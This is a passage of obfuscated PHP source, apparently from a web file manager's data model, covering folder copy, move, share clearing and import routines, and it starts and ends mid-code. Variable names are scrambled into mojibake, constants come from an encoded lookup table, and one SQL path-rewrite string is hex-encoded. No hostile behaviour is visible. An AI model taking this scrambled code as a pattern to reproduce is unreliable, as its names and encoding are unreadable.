$this->saveAll($ş‰Óä¿Ğ[$ååõ¢öÛ[601]]); Model($ååõ¢öÛ[216])->linkAdd($ş‰Óä¿Ğ[$ååõ¢öÛ[599]]); $this->folderSizeReset($İÙ§Î¾); $this->updateModifyTime($İÙ§Î¾); return $ ï‘ÎÒô; } private function _copy($Ğ¨ù—Î, $ªŒÆµá, $»ò™ÌÛ¦, &$¹ÊÚŸ¹ğ, $™××ÅÃí, $•ÓÒ„æü = '') { $€Ô—âĞÊ =& $_SERVER[•Ùç É]; $Ùİ€Š¾ò = $this->sourceInfoCache($Ğ¨ù—Î); $Ñğ¤µ÷Ê = $Ùİ€Š¾ò[$€Ô—âĞÊ[455]] == $€Ô—âĞÊ[90]; $è¦Ëş­µ = $•ÓÒ„æü ? $•ÓÒ„æü : $Ùİ€Š¾ò[$€Ô—âĞÊ[32]]; $¯¡¸È·Á = $this->fileNameExistAuto($ªŒÆµá, $Ùİ€Š¾ò); if ($™××ÅÃí) { $this->_childrenAllMake($Ğ¨ù—Î); if ($Ñğ¤µ÷Ê && $¯¡¸È·Á) { $this->_childrenAllMake($¯¡¸È·Á); } } if (!$¯¡¸È·Á) { return $this->_copyCreate($Ğ¨ù—Î, $ªŒÆµá, $è¦Ëş­µ, $¹ÊÚŸ¹ğ); } $¢¿¦°®ş = $¯¡¸È·Á; if ($Ñğ¤µ÷Ê) { if ($»ò™ÌÛ¦ == REPEAT_RENAME_FOLDER) { $è¦Ëş­µ = $this->fileNameAutoCache($ªŒÆµá, $è¦Ëş­µ, $»ò™ÌÛ¦, $Ñğ¤µ÷Ê); $¢¿¦°®ş = $this->_copyCreate($Ğ¨ù—Î, $ªŒÆµá, $è¦Ëş­µ, $¹ÊÚŸ¹ğ); } else { $¨Œ¼¾€Ú = $this->_childrenList($Ğ¨ù—Î); foreach ($¨Œ¼¾€Ú as $ÖÊùˆŸí) { $this->_copy($ÖÊùˆŸí[$€Ô—âĞÊ[183]], $¯¡¸È·Á, $»ò™ÌÛ¦, $¹ÊÚŸ¹ğ, !1); } } } else { if ($»ò™ÌÛ¦ == REPEAT_RENAME || $»ò™ÌÛ¦ == REPEAT_RENAME_FOLDER) { $è¦Ëş­µ = $this->fileNameAutoCache($ªŒÆµá, $è¦Ëş­µ, $»ò™ÌÛ¦, $Ñğ¤µ÷Ê); $¢¿¦°®ş = $this->_copyCreate($Ğ¨ù—Î, $ªŒÆµá, $è¦Ëş­µ, $¹ÊÚŸ¹ğ); } else { if ($»ò™ÌÛ¦ == REPEAT_REPLACE) { $Ó¹ ¼‹ò = $this->sourceInfoCache($¯¡¸È·Á); $Æ²„Ò»‘ = $this->fileHistory($Ó¹ ¼‹ò, $Ùİ€Š¾ò[$€Ô—âĞÊ[511]], $Ùİ€Š¾ò[$€Ô—âĞÊ[78]]); if ($Æ²„Ò»‘) { $¹ÊÚŸ¹ğ[$€Ô—âĞÊ[599]][] = $Ùİ€Š¾ò[$€Ô—âĞÊ[511]]; } } else { if ($»ò™ÌÛ¦ == REPEAT_SKIP) { } } } Hook::trigger($€Ô—âĞÊ[604], array($€Ô—âĞÊ[605], $Ùİ€Š¾ò, 0)); } return $¢¿¦°®ş; } private function _copyCreate($›ÖóÎ¼œ, $¨†áËâ, $„¬ÙÇœü, &$×ıëÂİÅ) { $ä‰’æ¨„ =& $_SERVER[•Ùç É]; $ı½çõ£µ = $this->sourceInfoCache($›ÖóÎ¼œ); $ºÔÃßÆ = $this->sourceInfoCache($¨†áËâ); $²ƒüÙ› = $this->_makeItemData($ı½çõ£µ, $ºÔÃßÆ, $„¬ÙÇœü); Hook::trigger($ä‰’æ¨„[606], $²ƒüÙ›); Hook::trigger($ä‰’æ¨„[607], array($ä‰’æ¨„[608], $²ƒüÙ›, 0)); $»ëúšı… = $this->add($²ƒüÙ›); $Ìú»£€ = array($ä‰’æ¨„[183] => $»ëúšı…, $ä‰’æ¨„[32] => $„¬ÙÇœü); $this->_copyApplyMeta($Ìú»£€, $×ıëÂİÅ); if ($ı½çõ£µ[$ä‰’æ¨„[455]] != $ä‰’æ¨„[90]) { $×ıëÂİÅ[$ä‰’æ¨„[599]][] = $ı½çõ£µ[$ä‰’æ¨„[511]]; return $»ëúšı…; } $¨¡”™˜Ú = array(); $‰¨‚Éñ± = array(); $this->_childrenListAll($›ÖóÎ¼œ, $¨¡”™˜Ú); $ í±¹ü = count($¨¡”™˜Ú); if ($ í±¹ü == 0) { return $»ëúšı…; } $ƒò½½ß = $this->sourceInfo($»ëúšı…); foreach ($¨¡”™˜Ú as $ÆªÌ¹¼ä) { $æ®á‚Ìğ = $this->_makeItemData($ÆªÌ¹¼ä, $ƒò½½ß, $ÆªÌ¹¼ä[$ä‰’æ¨„[32]]); $æ®á‚Ìğ[$ä‰’æ¨„[555]] = $ÆªÌ¹¼ä[$ä‰’æ¨„[555]]; $‰¨‚Éñ±[] = $æ®á‚Ìğ; } $this->chunkEventSet($ä‰’æ¨„[609], array($ä‰’æ¨„[610], $²ƒüÙ›, $ í±¹ü)); $this->addAll($‰¨‚Éñ±, array(), !1); $¢ê™ˆÂü = $this->where(array($ä‰’æ¨„[182] => $»ëúšı…))->select(); $å‚œÕäÅ = $this->_childrenMakeRelation($¨¡”™˜Ú, $¢ê™ˆÂü); $å‚œÕäÅ[$›ÖóÎ¼œ] = $»ëúšı…; $´Ú«úñ = array(); $ğè¢ÆÀƒ = array(); foreach ($¢ê™ˆÂü as $ÆªÌ¹¼ä) { $ÄÁÓ¡ªô = $ÆªÌ¹¼ä[$ä‰’æ¨„[183]]; $–É­ ä¨ = $this->_childrenMatch($å‚œÕäÅ, $ÆªÌ¹¼ä, $ƒò½½ß); $´Ú«úñ[] = array($ä‰’æ¨„[183], $ÄÁÓ¡ªô, $ä‰’æ¨„[182], $–É­ ä¨[$ä‰’æ¨„[182]]); $ğè¢ÆÀƒ[] = array($ä‰’æ¨„[183], $ÄÁÓ¡ªô, $ä‰’æ¨„[555], $–É­ ä¨[$ä‰’æ¨„[555]]); $this->_copyApplyMeta($ÆªÌ¹¼ä, $×ıëÂİÅ); if ($ÆªÌ¹¼ä[$ä‰’æ¨„[455]] != $ä‰’æ¨„[90]) { $×ıëÂİÅ[$ä‰’æ¨„[599]][] = $ÆªÌ¹¼ä[$ä‰’æ¨„[511]]; } } $this->chunkEventSet($ä‰’æ¨„[611], array($ä‰’æ¨„[612], $²ƒüÙ›, $ í±¹ü)); $this->saveAll($´Ú«úñ); $this->chunkEventSet($ä‰’æ¨„[613], array($ä‰’æ¨„[614], $²ƒüÙ›, $ í±¹ü)); $this->saveAll($ğè¢ÆÀƒ); return $»ëúšı…; } private function _childrenMakeRelation($Ìõ’Ú, $ÚÃ”¡Öü) { $‰ºÔ½şú =& $_SERVER[•Ùç É]; $×¯•×å¼ = array(); $ğñŞØæ— = array(); foreach ($Ìõ’Ú as $ÛòÏÆÇÎ) { $å°¬³¡‰ = $ÛòÏÆÇÎ[$‰ºÔ½şú[32]] . $‰ºÔ½şú[8] . $ÛòÏÆÇÎ[$‰ºÔ½şú[555]]; $×¯•×å¼[$å°¬³¡‰] = $ÛòÏÆÇÎ[$‰ºÔ½şú[183]]; } foreach ($ÚÃ”¡Öü as $ÛòÏÆÇÎ) { $å°¬³¡‰ = $ÛòÏÆÇÎ[$‰ºÔ½şú[32]] . $‰ºÔ½şú[8] . $ÛòÏÆÇÎ[$‰ºÔ½şú[555]]; $†óáò³ì = $×¯•×å¼[$å°¬³¡‰]; $ğñŞØæ—[$†óáò³ì] = $ÛòÏÆÇÎ[$‰ºÔ½şú[183]]; } return $ğñŞØæ—; } private function _childrenMatch($“‘ş›€Á, $·Ù¥÷‚õ, $ü×•ëŒ) { $¹³­ÆÂª =& $_SERVER[•Ùç É]; $¥ñÌ¡ = $ü×•ëŒ[$¹³­ÆÂª[555]]; $Øï÷Ç» = $this->parentLevelArray($·Ù¥÷‚õ[$¹³­ÆÂª[555]]); foreach ($Øï÷Ç» as $Ã°Ïİ) { if (isset($“‘ş›€Á[$Ã°Ïİ])) { $¥ñÌ¡ .= $“‘ş›€Á[$Ã°Ïİ] . $¹³­ÆÂª[615]; } } $¥ñÌ¡ = rtrim($¥ñÌ¡, $¹³­ÆÂª[50]) . $¹³­ÆÂª[50]; $ùúËöÇ = $this->parentLevelArray($¥ñÌ¡); $™Ì¸•¢ = $ùúËöÇ[count($ùúËöÇ) - 1]; return array($¹³­ÆÂª[182] => $™Ì¸•¢, $¹³­ÆÂª[555] => $¥ñÌ¡); } private function _makeItemData($´À¦­ù, $‡ß«Å™, $¦˜öò‰) { $î’˜öóğ =& $_SERVER[•Ùç É]; $ñÚî¸¡Ò = array($î’˜öóğ[616] => $´À¦­ù[$î’˜öóğ[455]], $î’˜öóğ[464] => $¦˜öò‰, $î’˜öóğ[617] => $´À¦­ù[$î’˜öóğ[456]] ? $´À¦­ù[$î’˜öóğ[456]] : $î’˜öóğ[12], $î’˜öóğ[512] => $´À¦­ù[$î’˜öóğ[511]] ? $´À¦­ù[$î’˜öóğ[511]] : 0, $î’˜öóğ[587] => $´À¦­ù[$î’˜öóğ[78]] ? $´À¦­ù[$î’˜öóğ[78]] : 0, $î’˜öóğ[618] => intval($‡ß«Å™[$î’˜öóğ[180]]), $î’˜öóğ[619] => intval($‡ß«Å™[$î’˜öóğ[540]]), $î’˜öóğ[620] => intval(USER_ID), $î’˜öóğ[621] => intval(USER_ID), $î’˜öóğ[447] => intval($‡ß«Å™[$î’˜öóğ[183]]), $î’˜öóğ[622] => $‡ß«Å™[$î’˜öóğ[555]] . $‡ß«Å™[$î’˜öóğ[183]] . $î’˜öóğ[50], $î’˜öóğ[468] => $´À¦­ù[$î’˜öóğ[87]] ? $´À¦­ù[$î’˜öóğ[87]] : time(), $î’˜öóğ[474] => 0, $î’˜öóğ[623] => $î’˜öóğ[12]); return $ñÚî¸¡Ò; } private function _copyApplyMeta($ı–Ö‘—‹, &$ÊµÄğÙ) { $²·õ«ˆá =& $_SERVER[•Ùç É]; $ãóì¦Ã = $ı–Ö‘—‹[$²·õ«ˆá[183]]; $¾÷—Š«ç = $ı–Ö‘—‹[$²·õ«ˆá[32]]; if (!isset($ı–Ö‘—‹[$²·õ«ˆá[624]]) || !$ı–Ö‘—‹[$²·õ«ˆá[624]] || $ı–Ö‘—‹[$²·õ«ˆá[624]] == $²·õ«ˆá[214]) { $ÊµÄğÙ[$²·õ«ˆá[601]][] = array($²·õ«ˆá[183], $ãóì¦Ã, $²·õ«ˆá[624], short_id($ãóì¦Ã)); } if (Input::check($¾÷—Š«ç, $²·õ«ˆá[625])) { $ÊµÄğÙ[$²·õ«ˆá[600]][] = array($²·õ«ˆá[183] => $ãóì¦Ã, $²·õ«ˆá[96] => $²·õ«ˆá[508], $²·õ«ˆá[420] => str_replace($²·õ«ˆá[53], $²·õ«ˆá[12], Pinyin::get($¾÷—Š«ç))); $ÊµÄğÙ[$²·õ«ˆá[600]][] = array($²·õ«ˆá[183] => $ãóì¦Ã, $²·õ«ˆá[96] => $²·õ«ˆá[507], $²·õ«ˆá[420] => Pinyin::get($¾÷—Š«ç, $²·õ«ˆá[626])); } $ÊµÄğÙ[$²·õ«ˆá[600]][] = array($²·õ«ˆá[183] => $ãóì¦Ã, $²·õ«ˆá[96] => $²·õ«ˆá[487], $²·õ«ˆá[420] => KodSort::makeStr($¾÷—Š«ç)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($û™ö´ø) { $Ç«µôáÛ =& $_SERVER[•Ùç É]; $®¸ï÷¸’ = $this->sourceInfo($û™ö´ø); $°®åÙäô = $Ç«µôáÛ[627]; $†Û‘è½œ = array($Ç«µôáÛ[555] => array($Ç«µôáÛ[582], $®¸ï÷¸’[$Ç«µôáÛ[555]] . $û™ö´ø . $Ç«µôáÛ[583]), $Ç«µôáÛ[475] => $this->targetIsDelete); $¦äú›¾€ = $this->field($°®åÙäô)->where($†Û‘è½œ)->select(); if (!$¦äú›¾€) { return; } $¦äú›¾€ = array_to_keyvalue($¦äú›¾€, $Ç«µôáÛ[183]); foreach ($¦äú›¾€ as $ùÓÂ„„) { $Õ ºö¡ì = $ùÓÂ„„[$Ç«µôáÛ[182]]; $û™ö´ø = $ùÓÂ„„[$Ç«µôáÛ[183]]; if (!isset($this->_childrenListCache[$û™ö´ø]) && $ùÓÂ„„[$Ç«µôáÛ[455]] == $Ç«µôáÛ[90]) { $this->_childrenListCache[$û™ö´ø] = array(); } if (!isset($this->_childrenListCache[$Õ ºö¡ì])) { $this->_childrenListCache[$Õ ºö¡ì] = array(); } $this->_childrenListCache[$Õ ºö¡ì][$û™ö´ø] = $ùÓÂ„„; $this->_childrenItemCache[$û™ö´ø] = $ùÓÂ„„; } } private function _childrenListAll($ÖÍçÜÃ‰, &$£¿¨Áéñ) { $âŠÑ¸¯ =& $_SERVER[•Ùç É]; if (!isset($this->_childrenListCache[$ÖÍçÜÃ‰])) { return; } $ş•ûûÈ = $this->_childrenListCache[$ÖÍçÜÃ‰]; foreach ($ş•ûûÈ as $ë£ËüØ­ => $­àûŠáä) { $£¿¨Áéñ[$ë£ËüØ­] = $­àûŠáä; if ($­àûŠáä[$âŠÑ¸¯[455]] == $âŠÑ¸¯[90]) { $this->_childrenListAll($ë£ËüØ­, $£¿¨Áéñ); } } } private function sourceInfoCache($Û÷¨Â“­) { if (isset($this->_childrenItemCache[$Û÷¨Â“­])) { return $this->_childrenItemCache[$Û÷¨Â“­]; } return $this->sourceInfo($Û÷¨Â“­); } private function _childrenList($Â¤µ–úŒ) { if (isset($this->_childrenListCache[$Â¤µ–úŒ])) { return $this->_childrenListCache[$Â¤µ–úŒ]; } return $this->_childrenListSelect($Â¤µ–úŒ); } private function _childrenListSelect($ıÓÅŒß) { $ÌÅåĞæ =& $_SERVER[•Ùç É]; $ÁŸÊîà³ = array($ÌÅåĞæ[182] => $ıÓÅŒß, $ÌÅåĞæ[475] => $this->targetIsDelete); $ÃÚ˜³»ü = $this->where($ÁŸÊîà³)->select(); $ÃÚ˜³»ü = $ÃÚ˜³»ü ? $ÃÚ˜³»ü : array(); $¶²€—Šû = array_to_keyvalue($ÃÚ˜³»ü, $ÌÅåĞæ[183]); $this->_childrenListCache[$ıÓÅŒß] = $¶²€—Šû; foreach ($¶²€—Šû as $ıÓÅŒß => $áƒ ÏÕ) { $this->_childrenItemCache[$ıÓÅŒß] = $áƒ ÏÕ; } return $¶²€—Šû; } private function fileNameExistAuto($ºÌ½šß¢, $šƒñ×Ó) { $í»Ñ˜ÚÀ =& $_SERVER[•Ùç É]; if ($šƒñ×Ó[$í»Ñ˜ÚÀ[475]] == $í»Ñ˜ÚÀ[90]) { return $this->fileNameExist($ºÌ½šß¢, $šƒñ×Ó[$í»Ñ˜ÚÀ[32]]); } return $this->fileNameExistCache($ºÌ½šß¢, $šƒñ×Ó[$í»Ñ˜ÚÀ[32]]); } private function fileNameExistCache($¥ô‡¨ÂÙ, $òÇã“ÓÑ) { $ŠèÓ¤ó =& $_SERVER[•Ùç É]; $òÇã“ÓÑ = strtolower($òÇã“ÓÑ); $²ªç‰‡ƒ = $this->_childrenList($¥ô‡¨ÂÙ); foreach ($²ªç‰‡ƒ as $ğîõ¸¶À) { if ($òÇã“ÓÑ == strtolower($ğîõ¸¶À[$ŠèÓ¤ó[32]])) { return $ğîõ¸¶À[$ŠèÓ¤ó[183]]; } } return !1; } private function fileNameAutoCache($œ¤óÉËï, $ñÆış°, $Æ½ŞÄ¢, $¹€¿üí“) { $›åº¬ŒÕ =& $_SERVER[•Ùç É]; $†ˆ«¶«Ÿ = $this->_childrenList($œ¤óÉËï); $Ò½Ä®ÔÚ = array_to_keyvalue($†ˆ«¶«Ÿ, $›åº¬ŒÕ[12], $›åº¬ŒÕ[32]); return $this->fileNameAutoGet($Ò½Ä®ÔÚ, $ñÆış°, $Æ½ŞÄ¢, $¹€¿üí“); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($½†ºóÇû, $¶—¼á²Š, $Ğš…–åİ = REPEAT_REPLACE, $—şƒ•Èõ = '') { $ô‹Æ•î =& $_SERVER[•Ùç É]; $Š€êùïë = $this->sourceInfo($½†ºóÇû); $‘ç¬—³ï = $this->sourceInfo($¶—¼á²Š); if ($Š€êùïë[$ô‹Æ•î[182]] == $‘ç¬—³ï[$ô‹Æ•î[183]]) { if ($Š€êùïë[$ô‹Æ•î[475]] == $ô‹Æ•î[90]) { Model($ô‹Æ•î[473])->restore(array($½†ºóÇû)); } if (!$—şƒ•Èõ || $—şƒ•Èõ == $Š€êùïë[$ô‹Æ•î[32]]) { return $½†ºóÇû; } } $ÖòÊ¬¦× = $this->pathInfoMore($½†ºóÇû); if ($this->isParentOf($½†ºóÇû, $¶—¼á²Š)) { return !1; } if (!$Š€êùïë || !$‘ç¬—³ï || $‘ç¬—³ï[$ô‹Æ•î[455]] != $ô‹Æ•î[90]) { return !1; } Hook::trigger($ô‹Æ•î[628], $ÖòÊ¬¦×); $this->targetIsDelete = intval($Š€êùïë[$ô‹Æ•î[475]]); if ($Š€êùïë[$ô‹Æ•î[182]] == $¶—¼á²Š && $—şƒ•Èõ != $Š€êùïë[$ô‹Æ•î[32]]) { $Ô²Ä›ªö = $this->fileNameExist($¶—¼á²Š, $—şƒ•Èõ); if ($Ô²Ä›ªö && $Š€êùïë[$ô‹Æ•î[455]] == $ô‹Æ•î[214]) { $óïÅäÊÌ = $this->sourceInfo($Ô²Ä›ªö); $èÚİ§…„ = $this->fileHistory($óïÅäÊÌ, $Š€êùïë[$ô‹Æ•î[511]], $Š€êùïë[$ô‹Æ•î[78]]); if (!$èÚİ§…„) { Model($ô‹Æ•î[514])->remove($Š€êùïë[$ô‹Æ•î[511]]); } $this->removeNow($½†ºóÇû, !1); $this->folderSizeReset($¶—¼á²Š); Hook::trigger($ô‹Æ•î[629], $ÖòÊ¬¦×); return $Ô²Ä›ªö; } } $À¡ş½ = $—şƒ•Èõ ? $—şƒ•Èõ : $Š€êùïë[$ô‹Æ•î[32]]; $this->lockMoveStart($½†ºóÇû); $this->lockWriteStart($¶—¼á²Š, $À¡ş½); $—İëÙâ = array($ô‹Æ•î[599] => array(), $ô‹Æ•î[630] => !1); $this->clearShare($½†ºóÇû, $¶—¼á²Š); $ÎÑ¼ÛÉÜ = $this->fileNameExistAuto($¶—¼á²Š, $Š€êùïë); $†ˆø ´… = $this->_move($½†ºóÇû, $¶—¼á²Š, $Ğš…–åİ, $—İëÙâ, $—şƒ•Èõ); $this->sourceCacheClear(); if ($Š€êùïë[$ô‹Æ•î[455]] == $ô‹Æ•î[90] && $ÎÑ¼ÛÉÜ) { $this->folderSizeResetChildren($†ˆø ´…); } Model($ô‹Æ•î[216])->linkAdd($—İëÙâ[$ô‹Æ•î[599]]); if ($ÎÑ¼ÛÉÜ && $—İëÙâ[$ô‹Æ•î[630]]) { $this->removeNow($½†ºóÇû, !1); } $this->lockMoveEnd($½†ºóÇû); $this->lockWriteEnd($¶—¼á²Š, $À¡ş½); $this->folderSizeReset($Š€êùïë[$ô‹Æ•î[182]]); $this->folderSizeReset($¶—¼á²Š); $–ğ‚˜ø = array($Š€êùïë[$ô‹Æ•î[182]], $¶—¼á²Š); if ($Š€êùïë[$ô‹Æ•î[455]] == $ô‹Æ•î[90]) { $–ğ‚˜ø[] = $½†ºóÇû; } $this->updateModifyTime($–ğ‚˜ø); Model($ô‹Æ•î[603])->eventMove($½†ºóÇû, $Š€êùïë[$ô‹Æ•î[182]], $¶—¼á²Š); Hook::trigger($ô‹Æ•î[629], $ÖòÊ¬¦×); return $†ˆø ´…; } private function _move($…Šëæ‚„, $•»„Ø¬™, $‚ø±óö¶, &$ÁŠåÊÆœ, $õ®í€ü = '') { $²ªçß‚© =& $_SERVER[•Ùç É]; $ÙÙ»±Õ = $this->sourceInfo($…Šëæ‚„); $Ê£¯Ş±ê = $ÙÙ»±Õ[$²ªçß‚©[455]] == $²ªçß‚©[90]; $»ç¼ª÷¶ = $õ®í€ü ? $õ®í€ü : $ÙÙ»±Õ[$²ªçß‚©[32]]; $ø½Åš™Û = $this->fileNameExistAuto($•»„Ø¬™, $ÙÙ»±Õ); $this->lockMoveStart($…Šëæ‚„); $this->lockWriteStart($•»„Ø¬™, $»ç¼ª÷¶); if (!$ø½Åš™Û) { return $this->_moveForce($…Šëæ‚„, $•»„Ø¬™, $»ç¼ª÷¶); } $Ã’´Ø = $ø½Åš™Û; $áÉ—§¶Ï = !1; if ($Ê£¯Ş±ê) { if ($‚ø±óö¶ == REPEAT_RENAME_FOLDER) { $»ç¼ª÷¶ = $this->fileNameAuto($•»„Ø¬™, $»ç¼ª÷¶, $‚ø±óö¶, $Ê£¯Ş±ê); $Ã’´Ø = $this->_moveForce($…Šëæ‚„, $•»„Ø¬™, $»ç¼ª÷¶); } else { if ($‚ø±óö¶ == REPEAT_RENAME_FOLDER) { $‚ø±óö¶ = REPEAT_RENAME; } $ˆ¨…µá› = $this->_childrenListSelect($…Šëæ‚„); foreach ($ˆ¨…µá› as $ŞÃÀÄô) { $this->_move($ŞÃÀÄô[$²ªçß‚©[183]], $ø½Åš™Û, $‚ø±óö¶, $ÁŠåÊÆœ); } $áÉ—§¶Ï = !0; } } else { if ($‚ø±óö¶ == REPEAT_SKIP) { $áÉ—§¶Ï = !0; } else { if ($‚ø±óö¶ == REPEAT_RENAME || $‚ø±óö¶ == REPEAT_RENAME_FOLDER) { $»ç¼ª÷¶ = $this->fileNameAuto($•»„Ø¬™, $»ç¼ª÷¶, $‚ø±óö¶, $Ê£¯Ş±ê); $Ã’´Ø = $this->_moveForce($…Šëæ‚„, $•»„Ø¬™, $»ç¼ª÷¶); } else { if ($‚ø±óö¶ == REPEAT_REPLACE) { $ØË¨°Í = $this->sourceInfoCache($ø½Åš™Û); $Ê¦´õç„ = $this->fileHistory($ØË¨°Í, $ÙÙ»±Õ[$²ªçß‚©[511]], $ÙÙ»±Õ[$²ªçß‚©[78]]); $áÉ—§¶Ï = !0; if ($Ê¦´õç„) { $ÁŠåÊÆœ[$²ªçß‚©[599]][] = $ÙÙ»±Õ[$²ªçß‚©[511]]; } } } } } if ($áÉ—§¶Ï && !$ÁŠåÊÆœ[$²ªçß‚©[630]]) { $ÁŠåÊÆœ[$²ªçß‚©[630]] = !0; } return $Ã’´Ø; } private function _moveForce($êöÛÇ€ì, $‚¡í¾ÃŸ, $Å‘ÀÊîö) { $¸ò ıÓ° =& $_SERVER[•Ùç É]; $¥ÅÊşåš = $this->sourceInfo($êöÛÇ€ì); $¦Şïâô = $this->sourceInfo($‚¡í¾ÃŸ); $èñÓÜ„° = $¥ÅÊşåš[$¸ò ıÓ°[455]] == $¸ò ıÓ°[90]; $Û…ûëı = array($¸ò ıÓ°[447] => $¦Şïâô[$¸ò ıÓ°[183]], $¸ò ıÓ°[622] => $¦Şïâô[$¸ò ıÓ°[555]] . $¦Şïâô[$¸ò ıÓ°[183]] . $¸ò ıÓ°[50], $¸ò ıÓ°[618] => $¦Şïâô[$¸ò ıÓ°[180]], $¸ò ıÓ°[619] => $¦Şïâô[$¸ò ıÓ°[540]], $¸ò ıÓ°[621] => USER_ID, $¸ò ıÓ°[464] => $Å‘ÀÊîö); $†‹ÎÓˆ = $¥ÅÊşåš[$¸ò ıÓ°[180]] == SourceModel::TYPE_GROUP && $¦Şïâô[$¸ò ıÓ°[180]] == SourceModel::TYPE_GROUP && $¥ÅÊşåš[$¸ò ıÓ°[540]] == $¦Şïâô[$¸ò ıÓ°[540]]; if (!$†‹ÎÓˆ && $this->moveClearAuth) { Model($¸ò ıÓ°[538])->authClear($êöÛÇ€ì); } $úáÁáš = $¥ÅÊşåš[$¸ò ıÓ°[475]] == $¸ò ıÓ°[90] && $¦Şïâô[$¸ò ıÓ°[475]] != $¸ò ıÓ°[90]; if ($úáÁáš) { $Û…ûëı[$¸ò ıÓ°[474]] = 0; } if ($èñÓÜ„°) { $†œ·ŸùÛ = array($¸ò ıÓ°[622] => array($¸ò ıÓ°[582], $¥ÅÊşåš[$¸ò ıÓ°[555]] . $¥ÅÊşåš[$¸ò ıÓ°[183]] . $¸ò ıÓ°[583])); $ßÔÎóû² = $¥ÅÊşåš[$¸ò ıÓ°[555]] . $¥ÅÊşåš[$¸ò ıÓ°[183]] . $¸ò ıÓ°[50]; $ÔğÁÙóİ = $¦Şïâô[$¸ò ıÓ°[555]] . $¦Şïâô[$¸ò ıÓ°[183]] . $¸ò ıÓ°[50] . $¥ÅÊşåš[$¸ò ıÓ°[183]] . $¸ò ıÓ°[50]; $ÊèÖó±ï = array($¸ò ıÓ°[622] => array($¸ò ıÓ°[631], "\162\x65\160\x6c\x61\143\145\50\x70\x61\162\145\x6e\x74\114\x65\166\x65\154\54\47{$ßÔÎóû²}\47\x2c\47{$ÔğÁÙóİ}\x27\x29"), $¸ò ıÓ°[618] => $¦Şïâô[$¸ò ıÓ°[180]], $¸ò ıÓ°[619] => $¦Şïâô[$¸ò ıÓ°[540]]); if ($úáÁáš) { $ÊèÖó±ï[$¸ò ıÓ°[474]] = 0; } $this->where($†œ·ŸùÛ)->data($ÊèÖó±ï)->save(); } $this->where(array($¸ò ıÓ°[461] => $êöÛÇ€ì))->data($Û…ûëı)->save(); return $êöÛÇ€ì; } private function clearShare($¥‹Š¼øÍ, $¿ûìˆş—) { $³“—”ò =& $_SERVER[•Ùç É]; $÷ƒÍ‡×ë = $this->sourceInfo($¥‹Š¼øÍ); $Ó”¼çæÃ = $this->sourceInfo($¿ûìˆş—); if ($÷ƒÍ‡×ë[$³“—”ò[540]] == $Ó”¼çæÃ[$³“—”ò[540]] && $÷ƒÍ‡×ë[$³“—”ò[180]] == $³“—”ò[632]) { return; } $£µÒ÷òß = array($³“—”ò[555] => array($³“—”ò[582], $÷ƒÍ‡×ë[$³“—”ò[555]] . $¥‹Š¼øÍ . $³“—”ò[583])); $ÀüÄÜÜ¯ = $this->field($³“—”ò[461])->where($£µÒ÷òß)->getField($³“—”ò[183], !0); if (!$ÀüÄÜÜ¯) { return; } $£µÒ÷òß = array($³“—”ò[183] => array($³“—”ò[7], $ÀüÄÜÜ¯), $³“—”ò[633] => 1); $µ¹İ¨‚Í = Model($³“—”ò[634])->field($³“—”ò[635])->where($£µÒ÷òß)->select(); if (!$µ¹İ¨‚Í) { return; } $µ¹İ¨‚Í = array_to_keyvalue($µ¹İ¨‚Í, $³“—”ò[12], $³“—”ò[635]); $£µÒ÷òß = array($³“—”ò[635] => array($³“—”ò[7], $µ¹İ¨‚Í)); Model($³“—”ò[634])->where($£µÒ÷òß)->save(array($³“—”ò[633] => 0)); Model($³“—”ò[636])->where($£µÒ÷òß)->delete(); } public function copyFolderFromIO($ÄÀÉÛ¿©, $ŠÄ¬ùóİ, $¶àçñâ¸, $üÙğœö, $şØÚƒ¿, $‡µĞ¿Ş = false) { $âœ¥””ù =& $_SERVER[•Ùç É]; $‘æ“İ—¼ = array($âœ¥””ù[600] => array(), $âœ¥””ù[601] => array(), $âœ¥””ù[599] => array(), $âœ¥””ù[637] => array()); $ıß‹³‡ö = $‡µĞ¿Ş ? $‡µĞ¿Ş : $ÄÀÉÛ¿©->pathThis($ŠÄ¬ùóİ); $¾ÑË‡§Ë = $this->fileNameExist($¶àçñâ¸, $ıß‹³‡ö); $Úù²Èî¹ = $this->mkdir($¶àçñâ¸, $ıß‹³‡ö, $üÙğœö); if (!$¾ÑË‡§Ë || $üÙğœö == REPEAT_RENAME_FOLDER) { $üÙğœö = !1; } if ($¾ÑË‡§Ë) { $this->_childrenAllMake($¾ÑË‡§Ë); } Hook::trigger($âœ¥””ù[638]); $this->_copyChildTo($ÄÀÉÛ¿©, $ŠÄ¬ùóİ, $Úù²Èî¹, $üÙğœö, $‘æ“İ—¼, $şØÚƒ¿); Hook::trigger($âœ¥””ù[639]); if ($Úù²Èî¹) { $this->folderSizeResetChildren($Úù²Èî¹); } $this->_childrenListClear(); Model($âœ¥””ù[602])->addAll($‘æ“İ—¼[$âœ¥””ù[600]], array(), !0); Model($âœ¥””ù[603])->eventCopy($Úù²Èî¹); $this->saveAll($‘æ“İ—¼[$âœ¥””ù[601]]); Model($âœ¥””ù[514])->linkAdd($‘æ“İ—¼[$âœ¥””ù[599]]); Model($âœ¥””ù[514])->remove($‘æ“İ—¼[$âœ¥””ù[637]]); $this->folderSizeReset($¶àçñâ¸); $this->updateModifyTime($¶àçñâ¸); return $Úù²Èî¹; } private function _copyChildTo($øµÁ³Ïú, $Ö¯®ñÙ´, $à—»ÇšÎ, $Œş¤Á†Ù, &$ËÚùÊÕ , $¢‰£ıèª) { $Âíˆ¹¥¡ =& $_SERVER[•Ùç É]; $Ì‘­¦©Ù = $this->sourceInfoCache($à—»ÇšÎ); $ùƒ’±¨Ë = $øµÁ³Ïú->listPath($Ö¯®ñÙ´); $ùƒ’±¨Ë = $ùƒ’±¨Ë ? $ùƒ’±¨Ë : array($Âíˆ¹¥¡[85] => array(), $Âíˆ¹¥¡[84] => array()); $½³¿¿Ÿ÷ = array_merge($ùƒ’±¨Ë[$Âíˆ¹¥¡[85]], $ùƒ’±¨Ë[$Âíˆ¹¥¡[84]]); $ğ‰Â®û™ = $this->_addFiles($øµÁ³Ïú, $ùƒ’±¨Ë[$Âíˆ¹¥¡[85]], $¢‰£ıèª); $€¼Ç¨ï = array(); foreach ($½³¿¿Ÿ÷ as &$Íæ×¾) { if (isset($ğ‰Â®û™[$Íæ×¾[$Âíˆ¹¥¡[32]]])) { $Íæ×¾ = $ğ‰Â®û™[$Íæ×¾[$Âíˆ¹¥¡[32]]]; } $Íæ×¾[$Âíˆ¹¥¡[455]] = 